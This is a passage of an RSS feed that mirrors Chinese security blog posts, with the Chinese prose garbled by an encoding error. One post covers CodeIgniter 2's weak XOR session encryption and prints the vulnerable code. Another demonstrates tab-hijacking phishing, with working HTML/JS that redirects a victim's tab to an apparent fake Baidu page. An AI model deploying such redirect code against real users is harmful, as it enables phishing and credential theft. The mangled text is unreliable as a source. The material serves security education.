data-size=&quot;normal&quot; data-rawwidth=&quot;1484&quot; data-rawheight=&quot;655&quot;&gt;&lt;p&gt;å¯è§ï¼Œsessionæ•°æ®è¢«ç”¨PHPè‡ªå¸¦çš„serializeå‡½æ•°è¿›è¡Œåºåˆ—åŒ–ï¼Œå¹¶ç­¾ååä½œä¸º&lt;code class=&quot;inline&quot;&gt;ci_session&lt;/code&gt;çš„å€¼ã€‚åŸç†ä¸Šå’Œflaskå¦‚å‡ºä¸€è¾™ï¼Œæˆ‘å°±ä¸é‡è¿°äº†ã€‚ä½†å¥½åœ¨codeigniter2æ”¯æŒå¯¹sessionè¿›è¡ŒåŠ å¯†ï¼Œåªéœ€åœ¨é…ç½®æ–‡ä»¶ä¸­è®¾ç½®&lt;code class=&quot;inline&quot;&gt;$config[&#39;sess_encrypt_cookie&#39;] = TRUE;&lt;/code&gt;å³å¯ã€‚&lt;/p&gt;&lt;p&gt;åœ¨CI2.1.4åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªå¼±åŠ å¯†æ¼æ´ï¼ˆ &lt;a href=&quot;https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability&quot;&gt;https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability&lt;/a&gt; ï¼‰ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒä¸­æ²¡æœ‰å®‰è£…Mcryptæ‰©å±•ï¼Œåˆ™CIä¼šä½¿ç”¨ä¸€ä¸ªç›¸å¯¹æ¯”è¾ƒå¼±çš„åŠ å¯†æ–¹å¼æ¥å¤„ç†session:&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function _xor_encode($string, $key)
{
 $rand = &#39;&#39;;
 while (strlen($rand) &amp;lt; 32)
 {
  $rand .= mt_rand(0, mt_getrandmax());
 }
 $rand = $this-&amp;gt;hash($rand);
 $enc = &#39;&#39;;
 for ($i = 0; $i &amp;lt; strlen($string); $i++)
 {
  $enc .= substr($rand, ($i % strlen($rand)), 1).(substr($rand, ($i % strlen($rand)), 1) ^ substr($string, $i, 1));
 }
 return $this-&amp;gt;_xor_merge($enc, $key);
}

function _xor_merge($string, $key)
{
 $hash = $this-&amp;gt;hash($key);
 $str = &#39;&#39;;
 for ($i = 0; $i &amp;lt; strlen($string); $i++)
 {
  $str .= substr($string, $i, 1) ^ substr($hash, ($i % strlen($hash)), 1);
 }
 return $str;
}&lt;/code&gt;&lt;p&gt;å…¶ä¸­ç”¨åˆ°äº†&lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt;ã€å¼‚æˆ–ç­‰å­˜åœ¨å¤§é‡ç¼ºé™·çš„æ–¹æ³•ã€‚æˆ‘ä»¬é€šè¿‡å‡ ä¸ªç®€å•çš„è„šæœ¬ï¼ˆ &lt;a href=&quot;https://github.com/Dionach/CodeIgniterXor&quot;&gt;https://github.com/Dionach/CodeIgniterXor&lt;/a&gt; ï¼‰ï¼Œå³å¯åœ¨4ç§’åˆ°4åˆ†é’Ÿçš„æ—¶é—´ï¼Œç ´è§£CI2çš„å¯†é’¥ã€‚&lt;/p&gt;&lt;p&gt;è·å–åˆ°äº†å¯†é’¥ï¼Œæˆ‘ä»¬å³å¯ç¯¡æ”¹ä»»æ„sessionï¼Œå¹¶è‡ªå·±ç­¾ååŠåŠ å¯†ï¼Œæœ€åä¼ªé€ ä»»æ„ç”¨æˆ·ï¼Œæ³¨å…¥ä»»æ„å¯¹è±¡ï¼Œç”šè‡³é€šè¿‡ååºåˆ—åŒ–æ“ä½œé€ æˆæ›´å¤§çš„å±å®³ã€‚&lt;/p&gt;&lt;h2&gt;0x06 æ€»ç»“&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¥ä¸‰ä¸ªæ¡ˆä¾‹æ¥è¯´æ˜äº†å®¢æˆ·ç«¯sessionçš„å®‰å…¨é—®é¢˜ã€‚&lt;/p&gt;&lt;p&gt;ä¸Šè¿°ä¸‰ä¸ªé—®é¢˜ï¼Œå¦‚æœsessionæ˜¯å‚¨å­˜åœ¨æœåŠ¡å™¨æ–‡ä»¶æˆ–æ•°æ®åº“ä¸­ï¼Œåˆ™ä¸ä¼šå‡ºç°ã€‚å½“ç„¶ï¼Œè€ƒè™‘åˆ°flaskå’Œciéƒ½æ˜¯éå¸¸è½»é‡çš„webæ¡†æ¶ï¼Œå¾ˆå¯èƒ½è¿è¡Œåœ¨æ— æ³•æ“ä½œæ–‡ä»¶ç³»ç»Ÿæˆ–æ²¡æœ‰æ•°æ®åº“çš„æœåŠ¡å™¨ä¸Šï¼Œæ‰€ä»¥å®¢æˆ·ç«¯sessionæ˜¯æ— æ³•é¿å…çš„ã€‚&lt;/p&gt;&lt;p&gt;é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘è¿˜èƒ½æƒ³åˆ°å…¶ä»–å®¢æˆ·ç«¯sessionå¯èƒ½å­˜åœ¨çš„å®‰å…¨éšæ‚£ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;ç­¾åä½¿ç”¨hashå‡½æ•°è€Œéhmacå‡½æ•°ï¼Œå¯¼è‡´åˆ©ç”¨hashé•¿åº¦æ‰©å±•æ”»å‡»æ¥ä¼ªé€ session&lt;/li&gt;&lt;li&gt;ä»»æ„æ–‡ä»¶è¯»å–å¯¼è‡´å¯†é’¥æ³„éœ²ï¼Œè¿›ä¸€æ­¥é€ æˆèº«ä»½ä¼ªé€ æ¼æ´æˆ–ååºåˆ—åŒ–æ¼æ´ï¼ˆ &lt;a href=&quot;http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&quot;&gt;http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&lt;/a&gt; ï¼‰&lt;/li&gt;&lt;li&gt;å¦‚æœå®¢æˆ·ç«¯sessionä»…åŠ å¯†æœªç­¾åï¼Œåˆ©ç”¨CBCå­—èŠ‚ç¿»è½¬æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹åŠ å¯†sessionä¸­æŸéƒ¨åˆ†æ•°æ®ï¼Œæ¥è¾¾åˆ°èº«ä»½ä¼ªé€ çš„ç›®çš„&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;ä¸Šé¢è¯´çš„å‡ ç‚¹ï¼Œå„ä½CTFå‡ºé¢˜äººå¯ä»¥æ‹¿å»åšæ–‡ç« å•¦~å˜¿å˜¿ã€‚&lt;/p&gt;&lt;p&gt;ç›¸å¯¹çš„ï¼Œä½œä¸ºä¸€ä¸ªå¼€å‘è€…ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨çš„webæ¡†æ¶æˆ–webè¯­è¨€çš„sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ä¸­ï¼Œé‚£å°±å¿…é¡»ç‰¢è®°ä¸‹é¢å‡ ç‚¹ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;æ²¡æœ‰åŠ å¯†æ—¶ï¼Œç”¨æˆ·å¯ä»¥çœ‹åˆ°å®Œæ•´çš„sessionå¯¹è±¡&lt;/li&gt;&lt;li&gt;åŠ å¯†/ç­¾åä¸å®Œå–„æˆ–å¯†é’¥æ³„éœ²çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥ä¿®æ”¹ä»»æ„session&lt;/li&gt;&lt;li&gt;ä½¿ç”¨å¼ºå¥çš„åŠ å¯†åŠç­¾åç®—æ³•ï¼Œè€Œä¸æ˜¯è‡ªå·±é€ ï¼ˆåä¾‹discuzï¼‰&lt;/li&gt;&lt;/ol&gt;</description>
<author>å‘¨ä½©é›¨</author>
<guid isPermaLink="false">2018-03-26-34936378</guid>
<pubDate>Mon, 26 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>å‰ç«¯é»‘é­”æ³•ä¹‹è¿œç¨‹æ§åˆ¶åœ°å€æ </title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-13-34495488.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34495488&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-33395718b82a3db6e77cea8f881e7528_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;ä½œè€…ï¼š &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@å‘¨ä½©é›¨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0nï¼Œç°å°±èŒäºé•¿äº­ç§‘æŠ€ï¼Œé•¿æœŸå…³æ³¨å¹¶ç¬”è€•äºå®‰å…¨ç¼–ç ã€ä»£ç å®¡è®¡ç­‰æ–¹å‘]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ç”±äºä»Šå¤©çœ‹åˆ°ä¸€ç¯‡æ–‡ç« ã€Š&lt;a href=&quot;https://paper.seebug.org/538/&quot;&gt;å±é™©çš„ target=&quot;_blank&quot; ä¸ â€œopenerâ€&lt;/a&gt;ã€‹ï¼Œé‡Œé¢æåˆ°äº†ä¸€ä¸ªè€çŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯target=&quot;_blank&quot;çš„æ—¶å€™ï¼Œæ–°æ‰“å¼€çš„é¡µé¢å¯ä»¥é€šè¿‡window.openeræ¥æ§åˆ¶æºé¡µé¢çš„URLï¼Œè¿›è¡Œé’“é±¼æ”»å‡»ã€‚è¿™ä¸ªæ”»å‡»æ‰‹æ³•æˆ‘åœ¨åšå®¢ã€Š&lt;a href=&quot;https://www.leavesongs.com/HTML/opener-fishing.html&quot;&gt;ç¥å¥‡çš„openerå¯¹è±¡&lt;/a&gt;ã€‹ä¸­ä¹Ÿè¯´è¿‡ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚è¿™ç¯‡æ–‡ç« æŠ›å‡ºå¦ä¸€ç§ä¸targetæœ‰å…³çš„é’“é±¼æ”»å‡»ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x01&quot;&gt;0x01 æ•ˆæœæ¼”ç¤º&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;é¦–å…ˆå¯ä»¥çœ‹ä¸€ä¸ªå°ä¾‹å­ï¼š&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://675ba661.2m1.pw/41593a&quot;&gt;http://675ba661.2m1.pw/41593a&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_r.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1154&quot; data-rawheight=&quot;764&quot; data-thumbnail=&quot;https://pic3.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_b.jpg&quot;&gt;&lt;p&gt;æ‰“å¼€ä¸Šè¿°é“¾æ¥ï¼Œç„¶åç‚¹å‡»â€œclick meâ€ï¼Œæ‰“å¼€äº†ç™¾åº¦ã€‚è¿™æ—¶æŸ¥çœ‹åœ°å€æ ï¼Œçš„çš„ç¡®ç¡®æ˜¯ç™¾åº¦ï¼Œç„¶åæˆ‘ä»¬ç­‰å¾…10ç§’ï¼Œå†æ¬¡æŸ¥çœ‹åœ°å€æ ï¼Œè¿™ä¸ªæ—¶å€™å·²ç»å˜æˆæ”»å‡»è€…çš„ç½‘å€äº†ï¼›å³ä½¿æ­¤æ—¶æˆ‘ä»¬å†è®¿é—®æ·˜å®ç­‰é¡µé¢ï¼Œåªè¦ä»ç„¶åœ¨è¿™ä¸ªæ ‡ç­¾é¡µä¸‹ï¼Œåœ°å€æ å°±ä»ç„¶ä¼šè¢«æ§åˆ¶ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x02&quot;&gt;0x02 åŸç†è¯´æ˜&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;ä¸Šè¿°é¡µé¢çš„ä»£ç ä¹Ÿå¾ˆç®€å•ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;

&amp;lt;script&amp;gt;
function start() {
    setInterval(function() {
        baidu.href=&quot;http://675ba661.2m1.pw/baidu&quot;;
        baidu.click();
    }, 10000);
}
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;å¦‚æœç”¨æˆ·ç‚¹å‡»äº†è¶…é“¾æ¥â€œclick meâ€ï¼Œè¿™é‡Œä¼šå¯åŠ¨ä¸€ä¸ªå¾ªç¯å®šæ—¶å™¨ï¼Œæ¯è¿‡10ç§’é’Ÿï¼Œå°†ä¼šå°†è¶…é“¾æ¥çš„åœ°å€æ›´æ¢æˆä¸€ä¸ªä»¿ç™¾åº¦çš„é’“é±¼ç½‘ç«™ï¼Œå¹¶å†æ¬¡ç‚¹å‡»ã€‚ï¼ˆå½“ç„¶ï¼Œå¦‚æœæ˜¯çœŸå®æ”»å‡»çš„è¯ï¼Œæœ€å¥½æ˜¯åšä¸€ä¸ªçœŸå®ç›®æ ‡çš„åä»£æœåŠ¡å™¨ï¼Œè¿™ä¸ªåœ¨æˆ‘å¦ä¸€ç¯‡æ–‡ç« ã€Š&lt;a href=&quot;https://www.leavesongs.com/SOFT/play-with-openresty-lua-web.html&quot;&gt;openresty+luaåœ¨åå‘ä»£ç†æœåŠ¡ä¸­çš„ç©æ³•&lt;/a&gt;ã€‹ä¸­ä¹Ÿæœ‰è¯¦ç»†çš„ä»‹ç»ï¼‰ã€‚&lt;/p&gt;&lt;p&gt;è¿™é‡Œï¼Œè¶…é“¾æ¥çš„targetå±æ€§æŒ‡å®šç›®æ ‡URLåœ¨å“ªä¸ªé¡µé¢ä¸‹æ‰“å¼€ï¼Œå°±æ˜¯ç›®æ ‡é¡µé¢çš„window.nameã€‚å¦‚æœè¿™ä¸ªaæ ‡ç­¾çš„hrefå‘ç”Ÿäº†å˜åŒ–ï¼Œå†æ¬¡ç‚¹å‡»é“¾æ¥ï¼Œé¡µé¢ä»ç„¶ä¼šåœ¨ç›¸åŒçš„æ ‡ç­¾é¡µä¸‹æ‰“å¼€ï¼Œæ‰€ä»¥å°±è¦†ç›–äº†ä¸Šä¸€æ¬¡æ‰“å¼€çš„é¡µé¢ã€‚&lt;/p&gt;&lt;p&gt;æ¯”å¦‚ï¼Œæˆ‘ä»¬æ˜¯ä¸€ä¸ªâ€œç½‘å€å¯¼èˆªâ€ç±»å‹çš„æ¶æ„ç½‘ç«™ï¼Œç”¨æˆ·åœ¨æˆ‘ä»¬ç½‘ç«™ä¸Šæ‰“å¼€äº†ç™¾åº¦ã€æ·˜å®ç­‰æ ‡ç­¾é¡µé¢ï¼Œæˆ‘ä»¬å°†å¯ä»¥æ ¹æ®ç”¨æˆ·æ‰“å¼€çš„è¶…é“¾æ¥æ¥ç”Ÿæˆé’“é±¼é¡µé¢ï¼Œä¼ªé€ è¿™äº›ç½‘ç«™çš„ç™»å½•é¡µé¢ï¼Œç²¾å‡†åœ°è¿›è¡Œé’“é±¼ã€‚æˆ‘è¿™é‡Œå°±ä¸è¿›è¡Œæ¼”ç¤ºäº†ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x03&quot;&gt;0x03 æ‰©å±•å°è¯•&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;é™¤äº†è¶…é“¾æ¥ä»¥å¤–ï¼Œç”¨window.openä¹Ÿå¯ä»¥è¾¾åˆ°ä¸€æ ·çš„æ•ˆæœï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;javascript:;&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;

&amp;lt;script&amp;gt;
function start() {
    var w = window.open(&#39;https://www.baidu.com&#39;, &#39;baidu&#39;);
    setInterval(function() {
        w.location = &#39;http://675ba661.2m1.pw/baidu&#39;
    }, 5000)
}
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;ä¸è¿‡ï¼Œwindow.openç»å¸¸ä¼šè¢«å¹¿å‘Šæ‹¦æˆªç›¸å…³çš„åŠŸèƒ½ç»™é˜»æ­¢æ‰ï¼Œæ‰€ä»¥å¯èƒ½æ•ˆæœä¸å¦‚ç›´æ¥ç”¨è¶…é“¾æ¥ã€‚&lt;/p&gt;&lt;p&gt;é‚£ä¹ˆï¼Œç»§ç»­æ·±å…¥ç ”ç©¶ã€‚è¿™ä¸ªç°è±¡ç©¶ç«Ÿæ˜¯å¦å’Œwindow.nameæœ‰å…³å‘¢ï¼Ÿé‚£ä¹ˆæ˜¯ä¸æ˜¯æˆ‘ä»¬çŸ¥é“äº†æŸä¸ªé¡µé¢çš„nameï¼Œå³å¯å¯¹å…¶é¡µé¢çš„URLè¿›è¡Œæ§åˆ¶ï¼Ÿ&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªå®éªŒã€‚ç¼–å†™Aé¡µé¢ï¼ˆ &lt;a href=&quot;http://a.675ba661.2m1.pw/A_victim&quot;&gt;http://a.675ba661.2m1.pw/A_victim&lt;/a&gt; ï¼‰ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;p&amp;gt;Hello world.&amp;lt;/p&amp;gt;
&amp;lt;script&amp;gt;
window.name = &#39;baidu&#39;;
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;ç¼–å†™Bé¡µé¢ï¼ˆ &lt;a href=&quot;http://b.675ba661.2m1.pw/B_attacker&quot;&gt;http://b.675ba661.2m1.pw/B_attacker&lt;/a&gt; ï¼‰ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot;&amp;gt;click me&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;Aé¡µé¢æ˜¯ç›®æ ‡ç½‘ç«™ï¼Œå…¶ä¸­è®¾ç½®è‡ªå·±çš„nameæ˜¯baiduï¼›Bæ˜¯æ”»å‡»è€…çš„é¡µé¢ï¼Œå…¶ä¸­è®¾ç½®&lt;code class=&quot;inline&quot;&gt;target=&quot;baidu&quot;&lt;/code&gt; &lt;/p&gt;&lt;p&gt;æ˜¾ç„¶ï¼Œæˆ‘ä»¬åœ¨Bä¸­ç‚¹å‡»â€œclick meâ€ä»¥åï¼Œä¼šæ‰“å¼€ä¸€ä¸ªæ–°çš„é¡µé¢ï¼Œè€Œä¸æ˜¯ä¿®æ”¹Aé¡µé¢çš„URLã€‚è¿™ä¸ªå®éªŒè¯´æ˜ï¼ŒURLçš„è¿œç¨‹æ§åˆ¶å’Œwindow.nameæ²¡æœ‰ç›´æ¥å…³ç³»ï¼Œè€Œæ˜¯å’Œé¡µé¢çš„çˆ¶å­å…³ç³»æœ‰å…³ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x04&quot;&gt;0x04 æ€»ç»“&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡æ‰€æè¿°çš„æ”»å‡»æ–¹å¼å’Œopenerçš„æ”»å‡»æ–¹å¼æ¯”è¾ƒç›¸ä¼¼ï¼Œéƒ½æ˜¯åœ¨ä¸èƒ½è·¨åŸŸçš„æƒ…å†µä¸‹ï¼Œæ§åˆ¶ç›®æ ‡æ ‡ç­¾é¡µçš„URLï¼Œè¿›è€Œè¿›è¡Œé’“é±¼æ”»å‡»ã€‚&lt;/p&gt;&lt;p&gt;ä½†æˆ‘è§‰å¾—è¿™ä¸ªæ”»å‡»æŒä¹…å‹æ›´ä½³ï¼Œå› ä¸ºå³ä½¿ç”¨æˆ·åœ¨æ–°æ ‡ç­¾ä¸­è¾“å…¥è‡ªå·±çš„åŸŸåï¼Œæˆ–è€…åˆé€šè¿‡è¶…é“¾æ¥ç‚¹å‡»åˆ°å…¶ä»–ç½‘ç«™é‡Œï¼Œè¿™ä¸ªé¡µé¢çš„åœ°å€æ æ°¸è¿œæ˜¯å—åˆ°æºé¡µé¢çš„æ§åˆ¶çš„ã€‚ç†è®ºä¸Šåœ¨æºé¡µé¢ä¸å…³é—­çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥æ°¸ä¹…æ§åˆ¶æ–°é¡µé¢çš„åœ°å€æ ã€‚&lt;/p&gt;</description>
<author>å°è˜‘è‡</author>
<guid isPermaLink="false">2018-03-13-34495488</guid>
<pubDate>Tue, 13 Mar 2018 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
